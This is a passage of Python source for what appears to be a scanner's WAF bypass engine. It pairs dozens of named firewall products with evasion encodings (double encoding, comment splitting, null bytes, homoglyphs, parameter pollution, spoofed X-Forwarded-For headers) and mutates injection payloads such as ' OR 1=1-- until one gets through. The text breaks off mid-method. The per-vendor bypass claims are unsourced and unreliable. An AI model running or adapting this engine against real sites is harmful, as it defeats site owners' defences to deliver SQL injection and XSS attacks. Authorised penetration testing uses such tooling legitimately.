"""WAF adaptive bypass engine — centralized bypass strategies per WAF vendor.

Replaces ad-hoc bypass logic scattered across plugins with a single engine
that adapts encoding/evasion based on detected WAF fingerprint.

Usage::

    engine = WafBypassEngine()
    engine.set_waf("Cloudflare")

    # Get bypass-encoded payload
    variants = engine.encode("' OR 1=1--", "sqli")

    # Test and learn
    result = engine.test_bypass(ctx, base_url, "' OR 1=1--")
    if result.passed:
        print(f"Bypass found: {result.technique}")
"""

from __future__ import annotations

import logging
from dataclasses import dataclass, field
from urllib.parse import quote

logger = logging.getLogger(__name__)


# ---------------------------------------------------------------------------
# WAF fingerprint database
# ---------------------------------------------------------------------------

@dataclass(frozen=True)
class WafProfile:
    """WAF vendor profile with known bypass strategies."""
    name: str
    # Encoding techniques that tend to work against this WAF
    effective_encodings: tuple[str, ...] = ()
    # Headers that might bypass inspection
    bypass_headers: dict[str, str] = field(default_factory=dict)
    # Content-types that avoid body inspection
    safe_content_types: tuple[str, ...] = ()
    # Methods that bypass inspection
    safe_methods: tuple[str, ...] = ()
    # Known weaknesses
    notes: str = ""


WAF_PROFILES: dict[str, WafProfile] = {
    "Cloudflare": WafProfile(
        name="Cloudflare",
        effective_encodings=(
            "double_encode", "unicode_normalize", "multiline",
            "comment_split", "concat_function",
            "json_unicode_keys", "chunked_randomized", "path_normalization",
        ),
        bypass_headers={},
        safe_content_types=("multipart/form-data",),
        notes="Blocks most common patterns; double encoding and unicode often work",
    ),
    "AWS WAF": WafProfile(
        name="AWS WAF",
        effective_encodings=(
            "double_encode", "comment_split", "case_swap",
            "whitespace_variant", "null_byte",
            "json_unicode_keys", "double_slash", "matrix_params",
        ),
        bypass_headers={"X-Forwarded-For": "127.0.0.1"},
        notes="Rule-based; comment insertion and case swapping effective",
    ),
    "ModSecurity": WafProfile(
        name="ModSecurity",
        effective_encodings=(
            "double_encode", "unicode_normalize", "null_byte",
            "comment_split", "whitespace_variant", "multiline",
            "chunked_randomized", "json_duplicate_keys", "path_normalization",
        ),
        bypass_headers={},
        notes="CRS rules are comprehensive; multi-layer encoding needed",
    ),
    "Imperva/Incapsula": WafProfile(
        name="Imperva/Incapsula",
        effective_encodings=(
            "comment_split", "case_swap", "concat_function",
            "whitespace_variant",
        ),
        bypass_headers={},
        safe_content_types=("application/json",),
        notes="JSON body parsing sometimes less strict",
    ),
    "Akamai": WafProfile(
        name="Akamai",
        effective_encodings=(
            "double_encode", "unicode_normalize", "hpp",
            "comment_split",
        ),
        bypass_headers={},
        notes="HPP (HTTP Parameter Pollution) can split payloads across params",
    ),
    "F5 BIG-IP": WafProfile(
        name="F5 BIG-IP",
        effective_encodings=(
            "unicode_normalize", "case_swap", "comment_split",
            "whitespace_variant",
        ),
        bypass_headers={"X-Forwarded-For": "127.0.0.1"},
        notes="ASM rules vary; case swapping and unicode common bypasses",
    ),
    "Sucuri": WafProfile(
        name="Sucuri",
        effective_encodings=(
            "double_encode", "case_swap", "null_byte",
            "multiline",
        ),
        bypass_headers={},
        notes="Wordpress-focused; double encoding often works",
    ),
    "Barracuda": WafProfile(
        name="Barracuda",
        effective_encodings=(
            "case_swap", "comment_split", "whitespace_variant",
            "double_encode",
        ),
        bypass_headers={"X-Originating-IP": "127.0.0.1"},
        notes="Older rulesets; basic evasion often sufficient",
    ),
    "FortiWeb": WafProfile(
        name="FortiWeb",
        effective_encodings=(
            "unicode_normalize", "double_encode", "comment_split",
            "null_byte",
        ),
        bypass_headers={},
        notes="Fortinet product; unicode and encoding bypasses known",
    ),
    "DDoS-Guard": WafProfile(
        name="DDoS-Guard",
        effective_encodings=(
            "case_swap", "whitespace_variant", "comment_split",
            "double_encode",
        ),
        bypass_headers={},
        notes="Primarily DDoS protection; WAF rules often basic",
    ),
    "Qrator": WafProfile(
        name="Qrator",
        effective_encodings=(
            "case_swap", "double_encode", "whitespace_variant",
        ),
        bypass_headers={},
        notes="Russian DDoS/WAF; simpler rule set",
    ),
    "Wordfence": WafProfile(
        name="Wordfence",
        effective_encodings=(
            "double_encode", "comment_split", "case_swap",
            "null_byte",
        ),
        bypass_headers={"X-Forwarded-For": "127.0.0.1"},
        notes="WordPress plugin; IP-based bypass sometimes works",
    ),
    "Wallarm": WafProfile(
        name="Wallarm",
        effective_encodings=(
            "unicode_normalize", "multiline", "comment_split",
        ),
        bypass_headers={},
        notes="ML-based detection; unusual encodings may bypass",
    ),
    "Google Cloud Armor": WafProfile(
        name="Google Cloud Armor",
        effective_encodings=(
            "double_encode", "unicode_normalize", "comment_split",
            "whitespace_variant",
        ),
        bypass_headers={},
        notes="Pre-configured rules; multi-layer encoding needed",
    ),
    "Azure Front Door": WafProfile(
        name="Azure Front Door",
        effective_encodings=(
            "double_encode", "case_swap", "comment_split",
        ),
        bypass_headers={},
        notes="OWASP CRS based; similar to ModSecurity bypasses",
    ),
    "Palo Alto": WafProfile(
        name="Palo Alto",
        effective_encodings=(
            "unicode_normalize", "double_encode", "whitespace_variant",
        ),
        bypass_headers={},
        notes="Network-level inspection; encoding bypasses vary by config",
    ),
    "Citrix NetScaler": WafProfile(
        name="Citrix NetScaler",
        effective_encodings=(
            "unicode_normalize", "comment_split", "case_swap",
            "whitespace_variant",
        ),
        bypass_headers={},
        notes="AppFW module; unicode and comment injection known bypasses",
    ),
    "Radware AppWall": WafProfile(
        name="Radware AppWall",
        effective_encodings=(
            "double_encode", "case_swap", "comment_split",
        ),
        bypass_headers={},
        notes="Behavioral analysis; encoding chains needed",
    ),
    "NinjaFirewall": WafProfile(
        name="NinjaFirewall",
        effective_encodings=(
            "double_encode", "case_swap", "null_byte",
        ),
        bypass_headers={"X-Forwarded-For": "127.0.0.1"},
        notes="PHP-based; simpler rule set",
    ),
    "Nemesida WAF": WafProfile(
        name="Nemesida WAF",
        effective_encodings=(
            "double_encode", "case_swap", "whitespace_variant",
        ),
        bypass_headers={},
        notes="ML-based Russian WAF; creative encoding needed",
    ),
    # --- Additional WAF profiles (wafw00f coverage) ---
    "StackPath": WafProfile(
        name="StackPath",
        effective_encodings=(
            "double_encode", "case_swap", "comment_split", "unicode_normalize",
        ),
        bypass_headers={"X-Forwarded-For": "127.0.0.1"},
        notes="CDN-based WAF; double encoding and case evasion effective",
    ),
    "Fastly": WafProfile(
        name="Fastly",
        effective_encodings=(
            "double_encode", "comment_split", "whitespace_variant",
            "unicode_normalize",
        ),
        bypass_headers={},
        notes="VCL-based rules; multi-layer encoding needed",
    ),
    "StormWall": WafProfile(
        name="StormWall",
        effective_encodings=(
            "case_swap", "double_encode", "whitespace_variant",
        ),
        bypass_headers={},
        notes="Russian anti-DDoS with WAF; basic evasion often works",
    ),
    "Comodo WAF": WafProfile(
        name="Comodo WAF",
        effective_encodings=(
            "double_encode", "case_swap", "null_byte", "comment_split",
        ),
        bypass_headers={},
        notes="ModSecurity-based; similar bypass techniques",
    ),
    "SiteLock": WafProfile(
        name="SiteLock",
        effective_encodings=(
            "double_encode", "case_swap", "null_byte",
        ),
        bypass_headers={"X-Forwarded-For": "127.0.0.1"},
        notes="TrueShield WAF; basic encoding often sufficient",
    ),
    "Reblaze": WafProfile(
        name="Reblaze",
        effective_encodings=(
            "unicode_normalize", "double_encode", "comment_split",
            "multiline",
        ),
        bypass_headers={},
        notes="Cloud WAF; ML-based detection; unusual encodings may work",
    ),
    "Tencent Cloud WAF": WafProfile(
        name="Tencent Cloud WAF",
        effective_encodings=(
            "double_encode", "unicode_normalize", "comment_split",
            "whitespace_variant", "hpp",
        ),
        bypass_headers={},
        notes="Chinese cloud WAF; HPP and multi-layer encoding known to bypass",
    ),
    "Alibaba Cloud WAF": WafProfile(
        name="Alibaba Cloud WAF",
        effective_encodings=(
            "double_encode", "unicode_normalize", "case_swap",
            "comment_split", "hpp",
        ),
        bypass_headers={},
        notes="Chinese cloud WAF; similar to Tencent bypasses",
    ),
    "CDN77": WafProfile(
        name="CDN77",
        effective_encodings=(
            "case_swap", "double_encode", "whitespace_variant",
        ),
        bypass_headers={},
        notes="CDN with WAF features; basic evasion works",
    ),
    "KeyCDN": WafProfile(
        name="KeyCDN",
        effective_encodings=(
            "case_swap", "double_encode", "whitespace_variant",
        ),
        bypass_headers={},
        notes="Simple CDN WAF rules; basic evasion sufficient",
    ),
    "BulletProof Security": WafProfile(
        name="BulletProof Security",
        effective_encodings=(
            "double_encode", "case_swap", "null_byte",
        ),
        bypass_headers={"X-Forwarded-For": "127.0.0.1"},
        notes="WordPress plugin WAF; IP + encoding bypass",
    ),
    "Shield Security": WafProfile(
        name="Shield Security",
        effective_encodings=(
            "double_encode", "case_swap", "null_byte",
        ),
        bypass_headers={"X-Forwarded-For": "127.0.0.1"},
        notes="WordPress plugin; IP and encoding bypasses work",
    ),
    "SecuPress": WafProfile(
        name="SecuPress",
        effective_encodings=(
            "double_encode", "case_swap",
        ),
        bypass_headers={"X-Forwarded-For": "127.0.0.1"},
        notes="WordPress security plugin; simpler rules",
    ),
    "WebKnight": WafProfile(
        name="WebKnight",
        effective_encodings=(
            "unicode_normalize", "double_encode", "null_byte",
            "whitespace_variant",
        ),
        bypass_headers={},
        notes="IIS ISAPI filter; unicode and null byte common bypasses",
    ),
    "NAXSI": WafProfile(
        name="NAXSI",
        effective_encodings=(
            "double_encode", "unicode_normalize", "null_byte",
            "comment_split",
        ),
        bypass_headers={},
        notes="Nginx-based WAF; score-based detection; multi-technique needed",
    ),
    "LiteSpeed": WafProfile(
        name="LiteSpeed",
        effective_encodings=(
            "double_encode", "case_swap", "comment_split",
        ),
        bypass_headers={},
        notes="LiteSpeed built-in WAF; similar to ModSecurity",
    ),
    "ChinaCache": WafProfile(
        name="ChinaCache",
        effective_encodings=(
            "double_encode", "unicode_normalize", "hpp",
        ),
        bypass_headers={},
        notes="Chinese CDN WAF; multi-encoding effective",
    ),
    "Yundun": WafProfile(
        name="Yundun",
        effective_encodings=(
            "double_encode", "unicode_normalize", "case_swap",
            "whitespace_variant",
        ),
        bypass_headers={},
        notes="Chinese cloud WAF; encoding bypasses known",
    ),
    "Safe3 WAF": WafProfile(
        name="Safe3 WAF",
        effective_encodings=(
            "double_encode", "unicode_normalize", "null_byte",
        ),
        bypass_headers={},
        notes="Chinese WAF; encoding and null byte bypasses",
    ),
    "Safedog": WafProfile(
        name="Safedog",
        effective_encodings=(
            "unicode_normalize", "double_encode", "comment_split",
            "whitespace_variant", "null_byte", "hpp",
        ),
        bypass_headers={},
        notes="Chinese WAF; many encoding bypasses documented",
    ),
    "360 WAF": WafProfile(
        name="360 WAF",
        effective_encodings=(
            "double_encode", "unicode_normalize", "case_swap",
            "comment_split",
        ),
        bypass_headers={},
        notes="Qihoo 360 WAF; encoding chain bypasses",
    ),
    "Baidu Yunjiasu": WafProfile(
        name="Baidu Yunjiasu",
        effective_encodings=(
            "double_encode", "unicode_normalize", "hpp",
            "whitespace_variant",
        ),
        bypass_headers={},
        notes="Baidu CDN/WAF; encoding and HPP bypasses",
    ),
    "PowerCDN": WafProfile(
        name="PowerCDN",
        effective_encodings=(
            "case_swap", "double_encode", "whitespace_variant",
        ),
        bypass_headers={},
        notes="Basic CDN WAF; simple evasion works",
    ),
    "Edgecast/Verizon": WafProfile(
        name="Edgecast/Verizon",
        effective_encodings=(
            "double_encode", "comment_split", "case_swap",
        ),
        bypass_headers={},
        notes="CDN WAF rules; standard encoding bypasses",
    ),
    "Limelight": WafProfile(
        name="Limelight",
        effective_encodings=(
            "double_encode", "case_swap", "whitespace_variant",
        ),
        bypass_headers={},
        notes="CDN WAF; basic evasion techniques",
    ),
    "ArvanCloud": WafProfile(
        name="ArvanCloud",
        effective_encodings=(
            "double_encode", "unicode_normalize", "case_swap",
        ),
        bypass_headers={},
        notes="Iranian CDN/WAF; encoding bypasses effective",
    ),
    "BitNinja": WafProfile(
        name="BitNinja",
        effective_encodings=(
            "double_encode", "case_swap", "null_byte",
        ),
        bypass_headers={"X-Forwarded-For": "127.0.0.1"},
        notes="Server security; IP bypass sometimes works",
    ),
    "Approach": WafProfile(
        name="Approach",
        effective_encodings=(
            "double_encode", "case_swap", "unicode_normalize",
        ),
        bypass_headers={},
        notes="Approach WAF; encoding bypasses known",
    ),
    "CrawlProtect": WafProfile(
        name="CrawlProtect",
        effective_encodings=(
            "case_swap", "double_encode", "null_byte",
        ),
        bypass_headers={"X-Forwarded-For": "127.0.0.1"},
        notes="Simple PHP WAF; basic evasion works",
    ),
    "DenyAll": WafProfile(
        name="DenyAll",
        effective_encodings=(
            "unicode_normalize", "double_encode", "comment_split",
        ),
        bypass_headers={},
        notes="DenyAll rWeb; unicode and encoding bypasses",
    ),
    "dotDefender": WafProfile(
        name="dotDefender",
        effective_encodings=(
            "unicode_normalize", "double_encode", "null_byte",
            "whitespace_variant",
        ),
        bypass_headers={},
        notes="Applicure dotDefender; encoding chain bypasses",
    ),
    "Expression Engine": WafProfile(
        name="Expression Engine",
        effective_encodings=(
            "double_encode", "case_swap",
        ),
        bypass_headers={},
        notes="EE built-in WAF; basic encoding bypass",
    ),
    "IBM DataPower": WafProfile(
        name="IBM DataPower",
        effective_encodings=(
            "unicode_normalize", "double_encode", "comment_split",
            "whitespace_variant",
        ),
        bypass_headers={},
        notes="IBM gateway; multi-encoding needed",
    ),
    "Janusec": WafProfile(
        name="Janusec",
        effective_encodings=(
            "double_encode", "case_swap", "comment_split",
        ),
        bypass_headers={},
        notes="Open-source WAF; standard encoding bypasses",
    ),
    "Jiasule": WafProfile(
        name="Jiasule",
        effective_encodings=(
            "double_encode", "unicode_normalize", "hpp",
        ),
        bypass_headers={},
        notes="Chinese CDN WAF; encoding and HPP bypass",
    ),
    "MalCare": WafProfile(
        name="MalCare",
        effective_encodings=(
            "double_encode", "case_swap", "null_byte",
        ),
        bypass_headers={"X-Forwarded-For": "127.0.0.1"},
        notes="WordPress WAF plugin; IP + encoding bypass",
    ),
    "Mission Control": WafProfile(
        name="Mission Control",
        effective_encodings=(
            "double_encode", "case_swap",
        ),
        bypass_headers={},
        notes="Mission Control WAF; basic bypasses work",
    ),
    "PerimeterX": WafProfile(
        name="PerimeterX",
        effective_encodings=(
            "unicode_normalize", "double_encode", "multiline",
        ),
        bypass_headers={},
        notes="Bot protection + WAF; JS challenge based; encoding may help",
    ),
    "Profense": WafProfile(
        name="Profense",
        effective_encodings=(
            "double_encode", "unicode_normalize", "whitespace_variant",
        ),
        bypass_headers={},
        notes="Profense WAF; encoding chain bypasses",
    ),
    "RSFirewall": WafProfile(
        name="RSFirewall",
        effective_encodings=(
            "double_encode", "case_swap", "null_byte",
        ),
        bypass_headers={"X-Forwarded-For": "127.0.0.1"},
        notes="Joomla WAF; basic encoding + IP bypass",
    ),
    "SquareSpace WAF": WafProfile(
        name="SquareSpace WAF",
        effective_encodings=(
            "double_encode", "case_swap",
        ),
        bypass_headers={},
        notes="SquareSpace built-in protection; basic evasion",
    ),
    "Teros/Citrix": WafProfile(
        name="Teros/Citrix",
        effective_encodings=(
            "unicode_normalize", "double_encode", "comment_split",
        ),
        bypass_headers={},
        notes="Legacy Citrix WAF; unicode and comments bypass",
    ),
    "TrafficShield": WafProfile(
        name="TrafficShield",
        effective_encodings=(
            "double_encode", "case_swap", "null_byte",
        ),
        bypass_headers={},
        notes="F5 TrafficShield; encoding bypasses",
    ),
    "URLMaster": WafProfile(
        name="URLMaster",
        effective_encodings=(
            "double_encode", "case_swap",
        ),
        bypass_headers={},
        notes="DNN WAF; basic encoding bypass",
    ),
    "URLScan": WafProfile(
        name="URLScan",
        effective_encodings=(
            "unicode_normalize", "double_encode", "null_byte",
        ),
        bypass_headers={},
        notes="IIS URLScan filter; unicode and null byte bypass",
    ),
    "Varnish": WafProfile(
        name="Varnish",
        effective_encodings=(
            "double_encode", "comment_split", "case_swap",
        ),
        bypass_headers={},
        notes="Varnish with VCL security rules; encoding bypass",
    ),
    "Virusdie": WafProfile(
        name="Virusdie",
        effective_encodings=(
            "double_encode", "case_swap",
        ),
        bypass_headers={},
        notes="Website security WAF; basic evasion",
    ),
    "WatchGuard": WafProfile(
        name="WatchGuard",
        effective_encodings=(
            "unicode_normalize", "double_encode", "comment_split",
        ),
        bypass_headers={},
        notes="WatchGuard firewall WAF module; encoding chain",
    ),
    "Sophos UTM": WafProfile(
        name="Sophos UTM",
        effective_encodings=(
            "double_encode", "unicode_normalize", "comment_split",
            "whitespace_variant",
        ),
        bypass_headers={},
        notes="Sophos web protection; multi-encoding needed",
    ),
    "ZScaler": WafProfile(
        name="ZScaler",
        effective_encodings=(
            "double_encode", "unicode_normalize", "case_swap",
            "comment_split",
        ),
        bypass_headers={},
        notes="Cloud proxy WAF; encoding chain bypasses",
    ),
    "NetContinuum": WafProfile(
        name="NetContinuum",
        effective_encodings=(
            "double_encode", "case_swap", "whitespace_variant",
        ),
        bypass_headers={},
        notes="Legacy WAF; basic evasion sufficient",
    ),
    "BinarySec": WafProfile(
        name="BinarySec",
        effective_encodings=(
            "double_encode", "case_swap", "null_byte",
        ),
        bypass_headers={},
        notes="BinarySec WAF; encoding and null byte bypass",
    ),
    "BlockDoS": WafProfile(
        name="BlockDoS",
        effective_encodings=(
            "case_swap", "double_encode",
        ),
        bypass_headers={},
        notes="DDoS protection with basic WAF; simple evasion",
    ),
    "Incapsula (Bot)": WafProfile(
        name="Incapsula (Bot)",
        effective_encodings=(
            "case_swap", "comment_split", "whitespace_variant",
        ),
        bypass_headers={},
        safe_content_types=("application/json",),
        notes="Imperva bot detection layer; content-type switching may bypass",
    ),
    "Kona Site Defender": WafProfile(
        name="Kona Site Defender",
        effective_encodings=(
            "double_encode", "unicode_normalize", "hpp",
            "comment_split",
        ),
        bypass_headers={},
        notes="Akamai Kona; HPP and multi-encoding needed",
    ),
    "Yunaq": WafProfile(
        name="Yunaq",
        effective_encodings=(
            "double_encode", "unicode_normalize", "case_swap",
        ),
        bypass_headers={},
        notes="Chinese security WAF; encoding chain",
    ),
    "Open-Resty Lua WAF": WafProfile(
        name="Open-Resty Lua WAF",
        effective_encodings=(
            "double_encode", "unicode_normalize", "comment_split",
            "null_byte",
        ),
        bypass_headers={},
        notes="Lua-based Nginx WAF; multi-encoding needed",
    ),
    "Shadow Daemon": WafProfile(
        name="Shadow Daemon",
        effective_encodings=(
            "unicode_normalize", "double_encode", "comment_split",
        ),
        bypass_headers={},
        notes="Open-source WAF; encoding chain bypasses",
    ),
    "Bekchy": WafProfile(
        name="Bekchy",
        effective_encodings=(
            "double_encode", "case_swap",
        ),
        bypass_headers={},
        notes="Bekchy WAF; basic encoding bypass",
    ),
    "Unknown WAF": WafProfile(
        name="Unknown WAF",
        effective_encodings=(
            "double_encode", "case_swap", "comment_split",
            "whitespace_variant", "null_byte", "unicode_normalize",
            "chunked_transfer", "multipart_form", "hpp",
            "chunked_randomized", "matrix_params", "path_normalization",
            "double_slash", "trailing_dot", "json_unicode_keys",
            "json_scientific_numbers", "json_duplicate_keys",
            "json_comment_injection", "header_case_variation",
        ),
        bypass_headers={"X-Forwarded-For": "127.0.0.1"},
        notes="Unknown WAF — try all techniques",
    ),
}


# ---------------------------------------------------------------------------
# Encoding strategies
# ---------------------------------------------------------------------------

@dataclass
class BypassResult:
    """Result of a bypass attempt."""
    original: str
    encoded: str
    technique: str
    passed: bool = False
    status: int = 0
    waf_name: str = ""


def _double_encode(payload: str) -> str:
    """Double URL-encode."""
    return quote(quote(payload, safe=""), safe="")


def _case_swap(payload: str) -> str:
    """Alternate case of SQL/JS keywords."""
    keywords = {
        "SELECT": "sElEcT", "UNION": "uNiOn", "OR": "oR", "AND": "aNd",
        "FROM": "fRoM", "WHERE": "wHeRe", "ORDER": "oRdEr", "INSERT": "iNsErT",
        "UPDATE": "uPdAtE", "DELETE": "dElEtE", "DROP": "dRoP",
        "EXEC": "eXeC", "SLEEP": "sLeEp", "WAITFOR": "wAiTfOr",
        "BENCHMARK": "bEnChMaRk",
        "script": "ScRiPt", "alert": "aLeRt", "onerror": "oNeRrOr",
        "onload": "oNlOaD", "javascript": "jAvAsCrIpT",
    }
    result = payload
    for kw, replacement in keywords.items():
        # Case-insensitive replacement preserving original case structure
        import re as _re
        pattern = _re.compile(_re.escape(kw), _re.IGNORECASE)
        result = pattern.sub(replacement, result, count=1)
    return result


def _comment_split(payload: str) -> str:
    """Insert SQL comments within keywords."""
    keywords = ["OR", "AND", "SELECT", "UNION", "FROM", "WHERE", "ORDER", "GROUP"]
    result = payload
    upper = result.upper()
    for kw in keywords:
        padded = f" {kw} "
        if padded in upper:
            idx = upper.index(padded)
            replacement = f" {kw[0]}/**/{kw[1:]} "
            result = result[:idx] + replacement + result[idx + len(padded):]
            upper = result.upper()
    return result


def _whitespace_variant(payload: str) -> str:
    """Replace spaces with tab characters."""
    return payload.replace(" ", "\t")


def _null_byte(payload: str) -> str:
    """Insert null byte before quote."""
    return payload.replace("'", "%00'").replace('"', '%00"')


def _unicode_normalize(payload: str) -> str:
    """Replace characters with Unicode homoglyphs."""
    table = {"'": "\u02bc", '"': "\u201c", "<": "\uff1c", ">": "\uff1e"}
    result = payload
    for orig, repl in table.items():
        result = result.replace(orig, repl, 1)
    return result


def _multiline(payload: str) -> str:
    """Insert newlines within payload."""
    return payload.replace(" ", "%0a")


def _concat_function(payload: str) -> str:
    """Replace string literals with CONCAT() calls (MySQL)."""
    # Replace 'test' with CONCAT('te','st')
    import re as _re
    def _split_string(m: _re.Match) -> str:
        s = m.group(1)
        if len(s) < 2:
            return m.group(0)
        mid = len(s) // 2
        return f"CONCAT('{s[:mid]}','{s[mid:]}')"
    return _re.sub(r"'([^']{2,})'", _split_string, payload)


def _hpp(payload: str) -> str:
    """HTTP Parameter Pollution — split payload across repeated params."""
    return payload.replace(" ", "&q=")


def _chunked_transfer(payload: str) -> str:
    """Simulate chunked Transfer-Encoding splitting for WAF bypass."""
    # Split payload into small hex-length chunks
    chunks = []
    step = 4
    for i in range(0, len(payload), step):
        chunk = payload[i:i + step]
        chunks.append(f"{len(chunk):x}\r\n{chunk}\r\n")
    chunks.append("0\r\n\r\n")
    return "".join(chunks)


def _multipart_form(payload: str) -> str:
    """Wrap payload in multipart/form-data boundary."""
    boundary = "----basilisk7x"
    return (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="data"\r\n\r\n'
        f"{payload}\r\n"
        f"--{boundary}--"
    )


def _html_entity_encode(payload: str) -> str:
    """Encode as HTML numeric character references."""
    return "".join(f"&#{ord(c)};" for c in payload)


def _hex_entity_encode(payload: str) -> str:
    """Encode as HTML hex character references."""
    return "".join(f"&#x{ord(c):x};" for c in payload)


def _js_unicode_encode(payload: str) -> str:
    """Encode as JavaScript Unicode escapes."""
    return "".join(f"\\u{ord(c):04x}" for c in payload)


def _overlong_utf8(payload: str) -> str:
    """Generate overlong UTF-8 encoding for path traversal bypass."""
    table = {".": "%c0%2e", "/": "%c0%af", "\\": "%c1%9c"}
    result = payload
    for orig, repl in table.items():
        result = result.replace(orig, repl)
    return result


def _json_unicode_escape(payload: str) -> str:
    """Encode using JSON Unicode escapes (\\uXXXX)."""
    return "".join(f"\\u{ord(c):04x}" if not c.isalnum() else c for c in payload)


def _chunked_randomized(payload: str) -> str:
    """Chunked encoding with randomized chunk sizes (1-8 bytes)."""
    import random
    chunks = []
    i = 0
    while i < len(payload):
        size = random.randint(1, min(8, len(payload) - i))
        chunk = payload[i:i + size]
        chunks.append(f"{len(chunk):x}\r\n{chunk}\r\n")
        i += size
    chunks.append("0\r\n\r\n")
    return "".join(chunks)


def _matrix_params(payload: str) -> str:
    """Insert matrix parameters into URL paths: /api/v1/users -> /api/v1;bsk=1/users."""
    if "/" in payload:
        parts = payload.rsplit("/", 1)
        if len(parts) == 2 and parts[0]:
            return f"{parts[0]};bsk=1/{parts[1]}"
    return f"{payload};bsk=1"


def _path_normalization(payload: str) -> str:
    """Path traversal normalization: /api/v1/users -> /api/v1/../v1/users."""
    if "/" not in payload:
        return payload
    parts = payload.split("/")
    if len(parts) >= 3:
        insert_at = 2
        seg = parts[insert_at - 1] if insert_at - 1 < len(parts) else ""
        return "/".join(parts[:insert_at]) + "/../" + seg + "/" + "/".join(parts[insert_at:])
    return payload


def _double_slash(payload: str) -> str:
    """Double slashes in path: /api/v1/users -> //api//v1//users."""
    return payload.replace("/", "//")


def _trailing_dot(payload: str) -> str:
    """Dot insertion in path segments: /api/v1/ -> /./api/./v1/."""
    return payload.replace("/", "/./")


def _json_unicode_keys(payload: str) -> str:
    """Unicode escape in JSON keys: {\"admin\":true} -> {\"\\u0061dmin\":true}."""
    import re as _re
    def _escape_key(m: _re.Match) -> str:
        key = m.group(1)
        if key:
            escaped = f"\\u{ord(key[0]):04x}{key[1:]}"
            return f'"{escaped}":'
        return m.group(0)
    return _re.sub(r'"(\w+)"\s*:', _escape_key, payload)


def _json_scientific_numbers(payload: str) -> str:
    """Scientific notation in JSON: {\"id\": 1} -> {\"id\": 1e0}."""
    import re as _re
    return _re.sub(
        r':\s*(\d+)([,\s}])',
        lambda m: f': {m.group(1)}e0{m.group(2)}',
        payload,
    )


def _json_duplicate_keys(payload: str) -> str:
    """Duplicate key (last-wins): {\"admin\":true} -> {\"admin\":false,\"admin\":true}."""
    import re as _re
    def _duplicate(m: _re.Match) -> str:
        key = m.group(1)
        value = m.group(2).strip()
        return f'"{key}": null, "{key}": {value}'
    return _re.sub(r'"(\w+)"\s*:\s*([^,}\]]+)', _duplicate, payload, count=1)


def _json_comment_injection(payload: str) -> str:
    """JSONC comment injection (parsed by JSON5/Node.js)."""
    if payload.startswith("{"):
        return payload[:1] + "/*bsk*/" + payload[1:]
    return "/*bsk*/ " + payload


def _header_case_variation(payload: str) -> str:
    """Mixed case for header-injected payloads."""
    result = []
    for i, c in enumerate(payload):
        if c.isalpha():
            result.append(c.upper() if i % 2 == 0 else c.lower())
        else:
            result.append(c)
    return "".join(result)


# Map encoding names to functions
ENCODING_FUNCTIONS: dict[str, callable] = {
    "double_encode": _double_encode,
    "case_swap": _case_swap,
    "comment_split": _comment_split,
    "whitespace_variant": _whitespace_variant,
    "null_byte": _null_byte,
    "unicode_normalize": _unicode_normalize,
    "multiline": _multiline,
    "concat_function": _concat_function,
    "hpp": _hpp,
    "chunked_transfer": _chunked_transfer,
    "multipart_form": _multipart_form,
    "html_entity_encode": _html_entity_encode,
    "hex_entity_encode": _hex_entity_encode,
    "js_unicode_encode": _js_unicode_encode,
    "overlong_utf8": _overlong_utf8,
    "json_unicode_escape": _json_unicode_escape,
    "chunked_randomized": _chunked_randomized,
    "matrix_params": _matrix_params,
    "path_normalization": _path_normalization,
    "double_slash": _double_slash,
    "trailing_dot": _trailing_dot,
    "json_unicode_keys": _json_unicode_keys,
    "json_scientific_numbers": _json_scientific_numbers,
    "json_duplicate_keys": _json_duplicate_keys,
    "json_comment_injection": _json_comment_injection,
    "header_case_variation": _header_case_variation,
}


# ---------------------------------------------------------------------------
# Main engine
# ---------------------------------------------------------------------------

class WafBypassEngine:
    """Adaptive WAF bypass engine.

    Selects encoding strategies based on detected WAF type.
    Tracks which techniques work and learns during a scan session.
    """

    def __init__(self) -> None:
        self._waf_name: str = ""
        self._profile: WafProfile | None = None
        self._working_techniques: dict[str, list[str]] = {}  # host -> [techniques]
        self._failed_techniques: dict[str, list[str]] = {}   # host -> [techniques]

    @property
    def waf_detected(self) -> bool:
        return bool(self._waf_name)

    @property
    def waf_name(self) -> str:
        return self._waf_name

    @property
    def profile(self) -> WafProfile | None:
        return self._profile

    def set_waf(self, waf_name: str) -> None:
        """Set the detected WAF type for this session."""
        self._waf_name = waf_name
        self._profile = WAF_PROFILES.get(waf_name, WAF_PROFILES.get("Unknown WAF"))
        logger.info("WAF bypass engine configured for: %s", waf_name)

    def set_waf_from_pipeline(self, host: str, pipeline: dict) -> None:
        """Auto-detect WAF from pipeline results."""
        waf_key = f"waf_detect:{host}"
        waf_result = pipeline.get(waf_key)
        if waf_result and waf_result.ok:
            waf_list = waf_result.data.get("waf", [])
            if waf_list:
                self.set_waf(waf_list[0])

    def encode(self, payload: str, category: str = "sqli") -> list[str]:
        """Generate bypass-encoded variants of a payload.

        Returns list of encoded variants, ordered by likelihood of success.
        If no WAF detected, returns [payload] unchanged.
        """
        if not self._profile:
            return [payload]

        variants: list[str] = [payload]
        seen: set[str] = {payload}

        for technique_name in self._profile.effective_encodings:
            fn = ENCODING_FUNCTIONS.get(technique_name)
            if fn is None:
                continue
            try:
                encoded = fn(payload)
                if encoded and encoded not in seen:
                    seen.add(encoded)
                    variants.append(encoded)
            except Exception:
                continue

        return variants

    def encode_with_headers(self, payload: str) -> list[tuple[str, dict[str, str]]]:
        """Generate variants with both encoding and header-based bypasses.

        Returns list of (encoded_payload, extra_headers).
        """
        result: list[tuple[str, dict[str, str]]] = []

        # Standard encoded variants without extra headers
        for variant in self.encode(payload):
            result.append((variant, {}))

        # Add header-based bypasses
        if self._profile and self._profile.bypass_headers:
            result.append((payload, dict(self._profile.bypass_headers)))
            # Combine with top encoding
            if len(self.encode(payload)) > 1:
                result.append((
                    self.encode(payload)[1],
                    dict(self._profile.bypass_headers),
                ))

        # Add content-type bypasses
        if self._profile and self._profile.safe_content_types:
            for ct in self._profile.safe_content_types:
                result.append((payload, {"Content-Type": ct}))

        return result

    def record_success(self, host: str, technique: str) -> None:
        """Record a working bypass technique for learning."""
        if host not in self._working_techniques:
            self._working_techniques[host] = []
        if technique not in self._working_techniques[host]:
            self._working_techniques[host].append(technique)
            logger.info("WAF bypass success: %s on %s", technique, host)

    def record_failure(self, host: str, technique: str) -> None:
        """Record a failed bypass technique."""
        if host not in self._failed_techniques:
            self._failed_techniques[host] = []
        if technique not in self._failed_techniques[host]:
            self._failed_techniques[host].append(technique)

    def get_working_techniques(self, host: str) -> list[str]:
